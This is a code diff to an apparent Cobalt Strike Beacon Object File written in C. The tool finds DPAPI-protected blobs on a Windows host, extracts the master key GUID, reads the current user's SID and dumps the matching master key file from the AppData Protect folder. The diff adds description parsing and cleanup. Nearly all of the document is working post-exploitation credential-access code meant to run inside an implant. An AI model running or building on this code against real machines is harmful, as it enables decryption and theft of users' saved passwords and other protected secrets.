@@ -1,42 +1,7 @@
 #include <windows.h>
 #include <sddl.h>
 #include "beacon.h"
-
-//////////////////////////////////////
-// DFR (Dynamic Function Resolution)
-// These allow the BOF to call Win32 APIs without being linked to DLLs at compile-time.
-//////////////////////////////////////
-DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
-DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
-DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
-DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError(void);
-DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess(void);
-DECLSPEC_IMPORT UINT   WINAPI KERNEL32$GetSystemDirectoryA(LPSTR, UINT);
-DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$FindFirstFileA(LPCSTR, LPWIN32_FIND_DATA);
-DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$FindNextFileA(HANDLE, LPWIN32_FIND_DATA);
-DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$FindClose(HANDLE);
-DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalFree(HLOCAL);
-DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetEnvironmentVariableA(LPCSTR, LPSTR, DWORD);
-
-DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
-DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
-DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$ConvertSidToStringSidA(PSID, LPSTR*);
-
-DECLSPEC_IMPORT void*  WINAPI MSVCRT$malloc(size_t);
-DECLSPEC_IMPORT void   WINAPI MSVCRT$free(void*);
-DECLSPEC_IMPORT void*  WINAPI MSVCRT$memcpy(void*, const void*, size_t);
-DECLSPEC_IMPORT size_t WINAPI MSVCRT$strlen(const char*);
-DECLSPEC_IMPORT int    WINAPI MSVCRT$strcmp(const char*, const char*);
-DECLSPEC_IMPORT int    WINAPI MSVCRT$_snprintf(char*, size_t, const char*, ...);
-DECLSPEC_IMPORT int    WINAPI MSVCRT$_vsnprintf(char*, size_t, const char*, va_list);
-
-// Utility macros to make the code look like standard C
-#define malloc    MSVCRT$malloc
-#define free      MSVCRT$free
-#define memcpy    MSVCRT$memcpy
-#define strlen    MSVCRT$strlen
-#define strcmp    MSVCRT$strcmp
-#define snprintf  MSVCRT$_snprintf
+#include "utils.h"
 
 // Global output object managed by BeaconFormat API
 formatp outputbuffer;
@@ -66,34 +31,17 @@ void dumpFileBytes(char* filePath) {
     KERNEL32$CloseHandle(hFile);
 }
 
-// Simple byte-pattern search function (equivalent to memstr)
-int IndexOfBytes(char* source, int sourceLen, char* pattern, int patternLen) {
-    if (!source || !pattern || patternLen == 0 || sourceLen < patternLen) return -1;
-    for (int i = 0; i <= sourceLen - patternLen; i++) {
-        int found = 1;
-        for (int j = 0; j < patternLen; j++) {
-            if (source[i + j] != pattern[j]) { found = 0; break; }
-        }
-        if (found) return i;
-    }
-    return -1;
-}
-
-// Reverses a byte array in-place (used for converting little-endian GUID components)
-void reverseBytes(char* array, int len) {
-    for (int i = 0; i < len / 2; i++) {
-        char temp = array[i];
-        array[i] = array[len - 1 - i];
-        array[len - 1 - i] = temp;
-    }
-}
-
 // Core logic: Parses a DPAPI blob to extract the associated Master Key GUID
 void parseFile(char* filePath) {
     HANDLE hFile = INVALID_HANDLE_VALUE;
     char buffer[1024];
     DWORD bytesRead;
+    
     char *szSid = NULL;
+    wchar_t* szLocalDesc = NULL;
+    char mkPath[MAX_PATH] = {0};
+    char guidStr[37] = {0};
+    DWORD descLen = 0;
 
     hFile = KERNEL32$CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) return;
@@ -112,7 +60,23 @@ void parseFile(char* filePath) {
         BeaconFormatPrintf(&outputbuffer, "[+] Found DPAPI blob: %s\n", filePath);
         dumpFileBytes(filePath);
 
-        // Extract Master Key GUID (starts 24 bytes after the magic header)
+        // 1. Extract Description
+        int indxDesc = idx + 44;
+        descLen = *(DWORD*)(buffer + indxDesc);
+
+        if (descLen > 2 && descLen < 1024) {
+            wchar_t* szDescRaw = (wchar_t*)(buffer + indxDesc + 4);
+            if ((indxDesc + 4 + descLen) <= bytesRead) {
+                szLocalDesc = (wchar_t*)malloc(descLen + 2);
+                if (szLocalDesc) {
+                    MSVCRT$memcpy(szLocalDesc, szDescRaw, descLen);
+                    szLocalDesc[descLen / 2] = L'\0';
+                    BeaconFormatPrintf(&outputbuffer, "[*] Description: %ls\n", szLocalDesc);
+                }
+            }
+        }
+
+        // 2. Extract and Format Master Key GUID (starts 24 bytes after the magic header)
         char mkGuidRaw[16];
         memcpy(mkGuidRaw, buffer + idx + 24, 16);
 
@@ -120,12 +84,11 @@ void parseFile(char* filePath) {
         char g1[4], g2[2], g3[2], g4[2], g5[6];
         memcpy(g1, mkGuidRaw, 4); memcpy(g2, mkGuidRaw + 4, 2); memcpy(g3, mkGuidRaw + 6, 2);
         memcpy(g4, mkGuidRaw + 8, 2); memcpy(g5, mkGuidRaw + 10, 6);
-
+        
         // DPAPI GUIDs store the first three blocks in Little-Endian
         reverseBytes(g1, 4); reverseBytes(g2, 2); reverseBytes(g3, 2);
 
         // Format raw bytes into a standard GUID string (e.g., AAAAAAAA-BBBB-CCCC-DDDD-EEEEEEEEEEEE)
-        char guidStr[37];
         snprintf(guidStr, sizeof(guidStr), 
             "%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X",
             (unsigned char)g1[0], (unsigned char)g1[1], (unsigned char)g1[2], (unsigned char)g1[3],
@@ -133,30 +96,40 @@ void parseFile(char* filePath) {
             (unsigned char)g4[0], (unsigned char)g4[1], (unsigned char)g5[0], (unsigned char)g5[1],
             (unsigned char)g5[2], (unsigned char)g5[3], (unsigned char)g5[4], (unsigned char)g5[5]);
 
-        // Get current user SID to build the path to the expected Master Key file
+        // 3. Get current user SID to build the path to the expected Master Key file
         HANDLE hToken;
         if (ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
             DWORD len = 0;
             ADVAPI32$GetTokenInformation(hToken, TokenUser, NULL, 0, &len);
             PTOKEN_USER pTUser = (PTOKEN_USER)malloc(len);
             if (pTUser && ADVAPI32$GetTokenInformation(hToken, TokenUser, pTUser, len, &len)) {
-                if (ADVAPI32$ConvertSidToStringSidA(pTUser->User.Sid, &szSid)) {
+                char *tempSid = NULL;
+                if (ADVAPI32$ConvertSidToStringSidA(pTUser->User.Sid, &tempSid)) {
+                    // We duplicate the SID string so we can manage it ourselves for the CSV
+                    size_t sidLen = strlen(tempSid);
+                    szSid = (char*)malloc(sidLen + 1);
+                    if (szSid) memcpy(szSid, tempSid, sidLen + 1);
+                    
                     char szProfilePath[MAX_PATH];
                     if (KERNEL32$GetEnvironmentVariableA("USERPROFILE", szProfilePath, MAX_PATH) > 0) {
                         // Construct path to the Master Key file in AppData
-                        char mkPath[MAX_PATH];
                         snprintf(mkPath, MAX_PATH, "%s\\AppData\\Roaming\\Microsoft\\Protect\\%s\\%s", 
                                  szProfilePath, szSid, guidStr);
-                        
                         BeaconFormatPrintf(&outputbuffer, "[*] Master Key GUID: %s\n", guidStr);
                         dumpFileBytes(mkPath);
                     }
-                    KERNEL32$LocalFree(szSid);
+                    KERNEL32$LocalFree(tempSid); // Free the one allocated by Windows
                 }
             }
             if (pTUser) free(pTUser);
             KERNEL32$CloseHandle(hToken);
         }
+
+        BeaconFormatPrintf(&outputbuffer, "- - - - - - - - - - - - - - - - -\n");
+
+        // --- CLEANUP ---
+        if (szLocalDesc) free(szLocalDesc);
+        if (szSid) free(szSid);
     }
 }
 
@@ -173,7 +146,7 @@ void go(char* args, int len) {
     dumpFlag = BeaconDataInt(&parser);
     g_DUMP_RAW = (dumpFlag == 1) ? TRUE : FALSE;
 
-    // Allocate the dynamic output buffer (initially 16KB)
+    // Allocate the dynamic output buffer (initially 16KB) should it be lower?
     BeaconFormatAlloc(&outputbuffer, 16384);
 
     if (searchMask == NULL) {
